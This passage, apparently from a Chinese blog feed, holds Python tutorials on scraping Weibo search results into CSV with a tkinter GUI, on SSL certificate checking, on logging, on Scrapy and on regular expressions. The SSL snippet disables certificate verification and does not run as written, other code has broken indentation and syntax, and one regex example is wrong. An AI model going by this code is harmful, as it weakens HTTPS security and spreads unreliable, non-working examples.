class="comment">#对正文进行提取，利用正则表达式删除HTML标签</span></span><br><span class="line">        <span class="comment">#re.compile正则表达式的字符串创建模式对象,re.S使.匹配包括换行在内的所有字符</span></span><br><span class="line">dr = re.compile(<span class="string">r'&lt;[^&gt;]+&gt;'</span>,re.S)</span><br><span class="line">        <span class="comment">#把数据以字典的形式保存在列表中</span></span><br><span class="line">result.append(&#123;</span><br><span class="line"><span class="string">'发布时间'</span>:card[mblogs][<span class="string">"created_at"</span>],</span><br><span class="line"><span class="string">'用户id'</span>:card[mblogs][<span class="string">"user"</span>][<span class="string">"id"</span>],</span><br><span class="line"><span class="string">'用户名'</span>:card[mblogs][<span class="string">"user"</span>][<span class="string">"screen_name"</span>],</span><br><span class="line"><span class="string">'微博地址'</span>:card[mblogs][<span class="string">"user"</span>][<span class="string">"profile_url"</span>],</span><br><span class="line"><span class="string">'转发数'</span>:card[mblogs][<span class="string">"reposts_count"</span>],</span><br><span class="line"><span class="string">'评论数'</span>:card[mblogs][<span class="string">"comments_count"</span>],</span><br><span class="line"><span class="string">'点赞数'</span>:card[mblogs][<span class="string">"attitudes_count"</span>],</span><br><span class="line"><span class="string">'正文'</span>:dr.sub(<span class="string">''</span>,text)&#125;)</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure><p>查看结果</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/10.jpg"  alt="10"></p><p>获取到的数据保存到.cvs文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> csv <span class="keyword">import</span> DictWriter</span><br><span class="line">......</span><br><span class="line"><span class="comment">#保存文件</span></span><br><span class="line"><span class="comment">#文件的名字</span></span><br><span class="line">file_name = <span class="string">'电影.csv'</span></span><br><span class="line">header = [<span class="string">'发布时间'</span>,<span class="string">'用户id'</span>,<span class="string">'用户名'</span>,<span class="string">'微博地址'</span>,<span class="string">'转发数'</span>,<span class="string">'评论数'</span>,<span class="string">'点赞数'</span>,<span class="string">'正文'</span>]</span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'a'</span>,newline = <span class="string">""</span>,encoding = <span class="string">'gb18030'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f_csv = DictWriter(f,header)<span class="comment">#DictWriter以字典形式写入</span></span><br><span class="line">    <span class="comment">#防止header重复写入</span></span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">'r'</span>, encoding=<span class="string">'gb18030'</span>, newline=<span class="string">""</span>) <span class="keyword">as</span> file:</span><br><span class="line">reader = csv.reader(file)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> [row <span class="keyword">for</span> row <span class="keyword">in</span> reader]:</span><br><span class="line">f_csv.writeheader()</span><br><span class="line">f_csv.writerows(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">f_csv.writerows(result)</span><br><span class="line">        <span class="comment">#延时，防止反爬机制</span></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>查看是否生成 “电影.csv” 文件</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/11.jpg"  alt="11"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/12.jpg"  alt="12"></p><p>完成程序编写。</p><h3 id="对源代码进行改进"><a href="#对源代码进行改进" class="headerlink" title="对源代码进行改进"></a>对源代码进行改进</h3><p>目前只是爬取一页的结果，以及每次搜索不同的关键词都要改源代码内容。</p><p>为了让该程序实用美观，引用tkinter建立GUI界面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *<span class="comment">#tkinter可以快速创建GUI应用程序</span></span><br><span class="line"><span class="keyword">from</span> csv <span class="keyword">import</span> DictWriter</span><br><span class="line">......</span><br><span class="line"><span class="comment">#创建一个窗口</span></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line"><span class="comment">#设计窗口大小以及位置  宽高400*100 位置(650,400)</span></span><br><span class="line">root.geometry(<span class="string">'405x80+650+400'</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#设计窗口标题</span></span><br><span class="line">root.title(<span class="string">'微博搜索'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#标签控件</span></span><br><span class="line">labl1 = Label(root,text = <span class="string">'关键词:'</span>,font = (<span class="string">'华文行楷'</span>,<span class="number">18</span>))</span><br><span class="line"><span class="comment">#网格显示标签,靠左显示</span></span><br><span class="line">labl1.grid(sticky=W)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入框</span></span><br><span class="line">entry = Entry(root,font = (<span class="string">'华文行楷'</span>,<span class="number">18</span>))</span><br><span class="line"><span class="comment">#网格显示标签</span></span><br><span class="line">entry.grid(row=<span class="number">0</span>,column=<span class="number">1</span>,sticky=W)</span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索按钮</span></span><br><span class="line">button = Button(root,text = <span class="string">'搜索'</span>,font = (<span class="string">'华文行楷'</span>,<span class="number">15</span>),command=sign)</span><br><span class="line"><span class="comment">#command=sign对程序进行对接</span></span><br><span class="line"><span class="comment">#网格式显示</span></span><br><span class="line">button.grid(row=<span class="number">0</span>,column=<span class="number">3</span>,sticky=E)</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示窗口</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/13.png"  alt="13"></p><p>对程序改进</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#获取输入结果</span></span><br><span class="line">key_word = entry.get()</span><br><span class="line"><span class="comment">#去除输入框的空格</span></span><br><span class="line">key_word = key_word.strip()</span><br><span class="line"><span class="comment">#判断输入是否为空</span></span><br><span class="line"><span class="keyword">if</span> key_word == <span class="string">''</span>:</span><br><span class="line"><span class="comment">#提示信息</span></span><br><span class="line">messagebox.showinfo(title = <span class="string">'提示'</span>,message = <span class="string">'请输入关键词'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#构造搜索内容</span></span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'containerid'</span>:<span class="string">'100103type=1&amp;q&#123;&#125;'</span>.format(key_word),</span><br><span class="line"><span class="string">'page_type'</span>:<span class="string">'searchall'</span>,</span><br><span class="line"><span class="string">'page'</span>:i,</span><br><span class="line">&#125;</span><br><span class="line">     ......</span><br><span class="line">    </span><br><span class="line">        <span class="comment">#文件的名字</span></span><br><span class="line">        file_name = key_word + <span class="string">'.csv'</span></span><br><span class="line"></span><br><span class="line">         ......</span><br><span class="line">        <span class="comment">#显示生成文件</span></span><br><span class="line">        <span class="comment">#标签控件</span></span><br><span class="line">        labl2 = Label(root,text = <span class="string">'查询完成：&#123;&#125;'</span>.format(file_name),font = (<span class="string">'华文行楷'</span>,<span class="number">15</span>))</span><br><span class="line">        <span class="comment">#网格显示标签,靠左显示</span></span><br><span class="line">        labl2.grid(row=<span class="number">1</span>,column=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/14.jpg"  alt="14"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/15.jpg"  alt="15"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/16.jpg"  alt="16"></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之请求SSL证书验证</title>
      <link href="/2020/04/27/%E8%AF%B7%E6%B1%82SSL%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/"/>
      <url>/2020/04/27/%E8%AF%B7%E6%B1%82SSL%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="请求SSL证书验证"><a href="#请求SSL证书验证" class="headerlink" title="请求SSL证书验证"></a>请求SSL证书验证</h2><p>HTTPS请求验证SSL证书，就像web游览器一样，网站的SSL证书经过CA认证，才能正常访问，如<a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></p><p>如果SSL认证不通过，或者操作系统不信任服务器的安全证书，比如访问12306网站：<a href="https://www.12306.cn/mormhweb/" target="_blank" rel="noopener">https://www.12306.cn/mormhweb/</a> 的时候，会警告用户证书不受信任。（12306网站证书是自己做的，没有通过CA认证）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SSL</span><br><span class="line"><span class="comment">#忽略SSL安全认证</span></span><br><span class="line">context = ssl._create_univerified_context()</span><br><span class="line"><span class="comment">#添加到context参数里</span></span><br><span class="line">html = requests.get(url,context=context)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之logging模块</title>
      <link href="/2020/04/27/%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA%E2%80%94logging%E6%A8%A1%E5%9D%97/"/>
      <url>/2020/04/27/%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA%E2%80%94logging%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="日志输出—logging模块"><a href="#日志输出—logging模块" class="headerlink" title="日志输出—logging模块"></a>日志输出—logging模块</h1><p>logging模块是Python内置的标准模块，主要用于输出运行日志，可以设置输出日志的等级、日志保存路径、日志文件回滚等；相比print，具备如下优点：</p><ol><li>可以通过设置不同的日志等级，在release版本中只输出重要信息，而不必显示大量的调试信息；</li><li>print将所有信息都输出到标准输出中，严重影响开发者从标准输出中查看其它数据；logging则可以由开发者决定将信息输出到什么地方，以及怎么输出；</li></ol><h2 id="logging基本配置"><a href="#logging基本配置" class="headerlink" title="logging基本配置"></a>logging基本配置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#############################  普通文件下的logging的基本设置   #########################</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="comment">#设置日志的输出格式</span></span><br><span class="line">logging.basicConfig(level = logging.INFO,<span class="comment">#设置输出等级</span></span><br><span class="line">                    <span class="comment">#设置输出格式</span></span><br><span class="line">                    format = <span class="string">' %(name)s '</span></span><br><span class="line">                     <span class="string">'- %(levelname)s'</span></span><br><span class="line">                     <span class="string">' - %(message)s'</span></span><br><span class="line">                    <span class="string">'- %(asctime)s'</span>,datefmt = <span class="string">'[%d/%b%Y %H:%M:%S]'</span><span class="comment">#设置输出时间</span></span><br><span class="line">                   )</span><br><span class="line"><span class="comment">#实例化</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"><span class="comment">#调用logger，可在任意文件中调用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'main'</span>:</span><br><span class="line">    logger.info(<span class="string">"Start print log"</span>)</span><br><span class="line">    logger.debug(<span class="string">"Do something"</span>)</span><br><span class="line">    logger.warning(<span class="string">"Something maybe fail."</span>)</span><br><span class="line">    logger.info(<span class="string">"Finish"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">############################   Scrapy下的基本设置   #################################</span></span><br><span class="line">settings中设置LOG_LEVEL=<span class="string">"WARNING"</span></span><br><span class="line">settings中设置LOG_FILE=<span class="string">"./a.log"</span><span class="comment">#设置日志保存的位置，设置后终端不会显示日志内容</span></span><br><span class="line"><span class="keyword">import</span> logging <span class="comment">#实例化logger的方式在任何文件中使用logger输出内容</span></span><br></pre></td></tr></table></figure><p>logging中可以选择很多消息级别，如：<strong>DEBUG，INFO，WARNING，ERROR，CRITICAL</strong>，通过赋予logger或者handler不同的级别，开发者就可以只输出错误信息到特定的记录文件，或者在调试时只记录调试信息</p><h3 id="logging-basicConfig函数各参数："><a href="#logging-basicConfig函数各参数：" class="headerlink" title="logging.basicConfig函数各参数："></a>logging.basicConfig函数各参数：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig函数各参数：</span><br><span class="line">filename：指定日志文件名；</span><br><span class="line"> </span><br><span class="line">filemode：和file函数意义相同，指定日志文件的打开模式，<span class="string">'w'</span>或者<span class="string">'a'</span>；</span><br><span class="line"> </span><br><span class="line">format：指定输出的格式和内容，format可以输出很多有用的信息，</span><br><span class="line"> </span><br><span class="line">datefmt：指定时间格式，同time.strftime()；</span><br><span class="line"> </span><br><span class="line">level：设置日志级别，默认为logging.WARNNING；</span><br><span class="line"> </span><br><span class="line">stream：指定将日志的输出流，可以指定输出到sys.stderr，sys.stdout或者文件，默认输出到sys.stderr，当stream和filename同时指定时，stream被忽略；</span><br></pre></td></tr></table></figure><h3 id="format定义了Logger记录的输出格式。"><a href="#format定义了Logger记录的输出格式。" class="headerlink" title="format定义了Logger记录的输出格式。"></a>format定义了Logger记录的输出格式。</h3><table><thead><tr><th>属性名称</th><th>格式</th><th>说明</th></tr></thead><tbody><tr><td>name</td><td>%(name)s</td><td>日志的名称</td></tr><tr><td>asctime</td><td>%(asctime)s</td><td>可读时间，默认格式‘2003-07-08 16:49:45,896’，逗号之后是毫秒</td></tr><tr><td>filename</td><td>%(filename)s</td><td>文件名，pathname的一部分</td></tr><tr><td>pathname</td><td>%(pathname)s</td><td>文件的全路径名称</td></tr><tr><td>funcName</td><td>%(funcName)s</td><td>调用日志多对应的方法名</td></tr><tr><td>levelname</td><td>%(levelname)s</td><td>日志的等级</td></tr><tr><td>levelno</td><td>%(levelno)s</td><td>数字化的日志等级</td></tr><tr><td>lineno</td><td>%(lineno)d</td><td>被记录日志在源码中的行数</td></tr><tr><td>module</td><td>%(module)s</td><td>模块名</td></tr><tr><td>msecs</td><td>%(msecs)d</td><td>时间中的毫秒部分</td></tr><tr><td>process</td><td>%(process)d</td><td>进程的ID</td></tr><tr><td>processName</td><td>%(processName)s</td><td>进程的名称</td></tr><tr><td>thread</td><td>%(thread)d</td><td>线程的ID</td></tr><tr><td>threadName</td><td>%(threadName)s</td><td>线程的名称</td></tr><tr><td>relativeCreated</td><td>%(relativeCreated)d</td><td>日志被创建的相对时间，以毫秒为单位</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Scrapy爬虫框架</title>
      <link href="/2020/04/27/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
      <url>/2020/04/27/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Scrapy爬虫框架"><a href="#Scrapy爬虫框架" class="headerlink" title="Scrapy爬虫框架"></a>Scrapy爬虫框架</h1><h2 id="安装Scrapy"><a href="#安装Scrapy" class="headerlink" title="安装Scrapy"></a>安装Scrapy</h2><p>pip install scrapy</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583387366469.png"  alt="1583387366469"></p><p>安装后测试</p><p>执行 scrapy -h</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583387522552.png"  alt="1583387522552"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line">1.在ubyntu 上安装 scrapy 之前，需要先安装以下依赖：</span><br><span class="line">sudo apt-get install python-dev python-pip libxm12-dev libxsltl-dev zlibig-dev libffi-dev，然后再通过pip install scrapy安装。</span><br><span class="line"></span><br><span class="line">2.如果在 windows 系统下，提示这个错误 ModuleNotFoundError： No module name &#39;win32api&#39;,那么使用以下命令可以解决：pip install pypiwin32</span><br></pre></td></tr></table></figure><h2 id="scrapy介绍"><a href="#scrapy介绍" class="headerlink" title="scrapy介绍"></a>scrapy介绍</h2><p>scrapy不是一个函数功能库而是 <strong>爬虫框架</strong></p><h3 id="爬虫框架"><a href="#爬虫框架" class="headerlink" title="爬虫框架"></a>爬虫框架</h3><p>爬虫框架是实现爬虫功能的一个软件结构和功能组件集合。</p><p>爬虫框架是一个半成品，能够帮助用户实现专业网络爬虫。</p><h3 id="“5-2”结构"><a href="#“5-2”结构" class="headerlink" title="“5+2”结构"></a>“5+2”结构</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583387992793.png"  alt="1583387992793"></p><h4 id="Engine（不需要用户修改）"><a href="#Engine（不需要用户修改）" class="headerlink" title="Engine（不需要用户修改）"></a>Engine（不需要用户修改）</h4><p>控制所有模块之间的数据流</p><p>根据条件触发</p><h4 id="Downloader（不需要用户修改）"><a href="#Downloader（不需要用户修改）" class="headerlink" title="Downloader（不需要用户修改）"></a>Downloader（不需要用户修改）</h4><p>根据请求下载网页</p><h4 id="Scheduler（不需要用户修改）"><a href="#Scheduler（不需要用户修改）" class="headerlink" title="Scheduler（不需要用户修改）"></a>Scheduler（不需要用户修改）</h4><p>对所有爬取请求进行调度管理</p><h4 id="Downloader-Middleware"><a href="#Downloader-Middleware" class="headerlink" title="Downloader Middleware"></a>Downloader Middleware</h4><p>目的：实施Engine、Scheduler和Downloader之间进行用户可配置的控制</p><p>功能：修改、丢弃、新增请求或响应</p><h4 id="Spider（需要用户编写配置代码）"><a href="#Spider（需要用户编写配置代码）" class="headerlink" title="Spider（需要用户编写配置代码）"></a>Spider（需要用户编写配置代码）</h4><p>解析Downloader返回的响应（Response）</p><p>产生爬取项（scraped item）</p><p>产生额外的爬取请求（Request）</p><h4 id="Item-Pipelines（需要用户编写配置代码）"><a href="#Item-Pipelines（需要用户编写配置代码）" class="headerlink" title="Item Pipelines（需要用户编写配置代码）"></a>Item Pipelines（需要用户编写配置代码）</h4><p>以流水线方式处理Spider产生的爬取项</p><p>由一组操作顺序组成，类似流水线，每个操作是一个Item Pipeline类型</p><p>可能操作不包括：清理、检验和查重爬取项中的HTML数据。将数据存储到数据库</p><h4 id="Spider-Middleware"><a href="#Spider-Middleware" class="headerlink" title="Spider Middleware"></a>Spider Middleware</h4><p>目的：对请求和爬取项的再处理</p><p>功能：修改、丢弃、新增请求或爬取项</p><h3 id="Scrapy命令行"><a href="#Scrapy命令行" class="headerlink" title="Scrapy命令行"></a>Scrapy命令行</h3><p>scrapy是为持续运行设计的专业爬虫框架，提供操作的Scrapy命令行。</p><h4 id="Scrapy命令行格式"><a href="#Scrapy命令行格式" class="headerlink" title="Scrapy命令行格式"></a>Scrapy命令行格式</h4><p>** &gt; scrapy &lt; command &gt; [options] [args]</p><p>command：Scrapy命令</p><h4 id="Scrapy常用命令"><a href="#Scrapy常用命令" class="headerlink" title="Scrapy常用命令"></a>Scrapy常用命令</h4><table><thead><tr><th>命令</th><th>说明</th><th>格式</th></tr></thead><tbody><tr><td>startproject</td><td>创建一个新工程</td><td>scrapy startproject &lt; name &gt; [dir]</td></tr><tr><td>genspider</td><td>创建一个爬虫</td><td>scrapy genspider [options] &lt; name &gt; &lt; domian &gt;</td></tr><tr><td>settings</td><td>获取爬虫配置信息</td><td>scrapy settings [options]</td></tr><tr><td>crawl</td><td>运行一个爬虫</td><td>scrapy crawl &lt; spider &gt;</td></tr><tr><td>list</td><td>列出工程中所有爬虫</td><td>scrapy list</td></tr><tr><td>shell</td><td>启动URL调试命令行</td><td>scrapy shell [url]</td></tr></tbody></table><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="演示HTML地址"><a href="#演示HTML地址" class="headerlink" title="演示HTML地址"></a>演示HTML地址</h3><p>演示HTML页面地址：<a href="http://python123.io/ws/demo.html" target="_blank" rel="noopener">http://python123.io/ws/demo.html</a></p><p>文件名称：demo.html</p><h3 id="产生步骤"><a href="#产生步骤" class="headerlink" title="产生步骤"></a>产生步骤</h3><h4 id="步骤1：建立以Scrapy爬虫工程"><a href="#步骤1：建立以Scrapy爬虫工程" class="headerlink" title="步骤1：建立以Scrapy爬虫工程"></a>步骤1：建立以Scrapy爬虫工程</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583390529399.png"  alt="1583390529399"></p><h5 id="生成的工程目录"><a href="#生成的工程目录" class="headerlink" title="生成的工程目录"></a>生成的工程目录</h5><p>python123demo/        外层目录</p><ul><li>scrapy.cfg                    部署Scrapy爬虫的配置文件</li><li>python123demo/        Scrapy框架的用户自定义python代码<ul><li>_ init _.py                        初始化脚本    </li><li>items.py                        Items代码模板,用来存放爬取下来的数据模型（继承类）</li><li>middlewares.py            Middlewares代码模板，用来存放各种中间件的文件（继承类）</li><li>pipelines .py                    Piplines代码模板，用来将items的模型存储到本地磁盘中（继承类）</li><li>settings.py                    Scrapy爬虫的配置文件，爬虫的配置信息（比如请求头、多久发送一次请求、ip代理池等）</li><li>spiders/                        Spiders代码模板目录，所以爬虫都需存放在这里（继承类）<ul><li>_ init _.py                初始文件，无需修改</li><li>_ pycache_/          缓存目录，无需修改</li></ul></li></ul></li></ul><h4 id="步骤2：在工程中产生一个Scrapy爬虫"><a href="#步骤2：在工程中产生一个Scrapy爬虫" class="headerlink" title="步骤2：在工程中产生一个Scrapy爬虫"></a>步骤2：在工程中产生一个Scrapy爬虫</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583391541994.png"  alt="1583391541994"></p><p>在\python123demo\spiders目录下生产demo.py文件</p><h5 id="demo-py文件"><a href="#demo-py文件" class="headerlink" title="demo.py文件"></a>demo.py文件</h5><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583391885587.png"  alt="1583391885587"></p><p>parse()用于处理响应，解析内容形成字典，发现新的URL爬取请求。</p><h4 id="步骤3：配置产生的spider爬虫"><a href="#步骤3：配置产生的spider爬虫" class="headerlink" title="步骤3：配置产生的spider爬虫"></a>步骤3：配置产生的spider爬虫</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583392533280.png"  alt="1583392533280"></p><h4 id="步骤4：运行爬虫，获取网页"><a href="#步骤4：运行爬虫，获取网页" class="headerlink" title="步骤4：运行爬虫，获取网页"></a>步骤4：运行爬虫，获取网页</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583392655796.png"  alt="1583392655796"></p>]]></content>
      
      
      <categories>
          
          <category> python - Scrapy爬虫框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python - Scrapy爬虫框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之正则表达式</title>
      <link href="/2020/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>regular expression     regex    RE</p><p><strong>正则表达式是用来简洁表达一组字符串的表达式</strong>。</p><ul><li>通用的字符串表达框架</li><li>简洁表达一组字符串的表达式</li><li>针对字符串吊打“简洁“和”特这“思想的工具</li><li>判断某字符串的特征归属</li></ul><p><strong>正则表达式在文本处理</strong></p><ul><li>表达文本类型的特征（病毒、入侵）</li><li>同时查找或替换一组字符串</li><li>匹配字符串的全部或部分</li></ul><p><strong>正则表达式的使用</strong></p><ul><li>编译：将符合正则表达式语法的字符串转换成为正则表达式特征</li></ul><p>例子：</p><p>‘PY’开头</p><p>后续存在不多于10个字符</p><p>后续字符不能是’p’ 或者 ‘Y’</p><p>​    ‘PYABC’    √</p><p>​    ‘PYKXYZ’    ×</p><p>正则表达式：PY[ ^PY ]{0,10}</p><h2 id="正则表达式的语法"><a href="#正则表达式的语法" class="headerlink" title="正则表达式的语法"></a>正则表达式的语法</h2><p><strong>正则表达式语法由字符和操作符构成</strong></p><p><strong>P(Y|YT|YTH|YTHO)?N</strong></p><h3 id="正则表达式常用操作符"><a href="#正则表达式常用操作符" class="headerlink" title="正则表达式常用操作符"></a>正则表达式常用操作符</h3><table><thead><tr><th>操作符</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td>.</td><td>表示任何单个字符</td><td></td></tr><tr><td>[]</td><td>字符集，对单个字符给出取值范围</td><td>[abc]表示a、b、c，[a-z]表示a到z单个字符</td></tr><tr><td>[^ ]</td><td>非字符集，对单个字符给出排除范围</td><td>[^abc]表示非a或b或c的单个字符</td></tr><tr><td>*</td><td>前一个字符0次或无限次扩展</td><td>abc*表示ab、abc、abcc、abccc等</td></tr><tr><td>+</td><td>前一个字符1次或无限次扩展</td><td>abc+表示abc、abcc、abccc等</td></tr><tr><td>?</td><td>前一个字符0次货1次扩展</td><td>abc？表示ab、abc</td></tr><tr><td>|</td><td>左右表达式任意一个</td><td>abc|def表示abc、def</td></tr><tr><td>{m}</td><td>扩展前一个字符m次</td><td>ab{2}c表示abbc</td></tr><tr><td>{m,n}</td><td>扩展前一个字符m至n次（含n）</td><td>ab{1,2}c表示abc，abbc</td></tr><tr><td>^</td><td>匹配字符串开头</td><td>^abc表示abc且在一个字符串的开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td><td>abc$表示abc且在一个字符串的结尾</td></tr><tr><td>()</td><td>分组标记，内部只能使用 | 操作符</td><td>(abc)表示abc，(abc|def)表示abc、def</td></tr><tr><td>\d</td><td>数字，等价于[0-9]</td><td></td></tr><tr><td>\w</td><td>单词字符，等价于[A-Za-z0-9_]</td><td></td></tr></tbody></table><h3 id="正则表达式语法实例"><a href="#正则表达式语法实例" class="headerlink" title="正则表达式语法实例"></a>正则表达式语法实例</h3><table><thead><tr><th>正则表达式</th><th>对应的字符串</th></tr></thead><tbody><tr><td>P(Y|YT|YTH|YTHO)?N</td><td>‘PN’、 ‘PYN’ 、 ‘PYTHN’、’PYTHON’</td></tr><tr><td>PYTHON+</td><td>‘PYTHON’、’PYTHONN’、’PYTHONNN’ …等</td></tr><tr><td>PY[TH]ON</td><td>‘PYTON’、’PYHON’</td></tr><tr><td>PY[ ^TH]?ON</td><td>‘PYON’、’PYaON’、’PYbON’、’PYcON’ …等</td></tr><tr><td>PY{:3}N</td><td>‘PN’、’PYN’、’PYYN’、’PYYYN’</td></tr></tbody></table><h3 id="经典的正则表达式实例"><a href="#经典的正则表达式实例" class="headerlink" 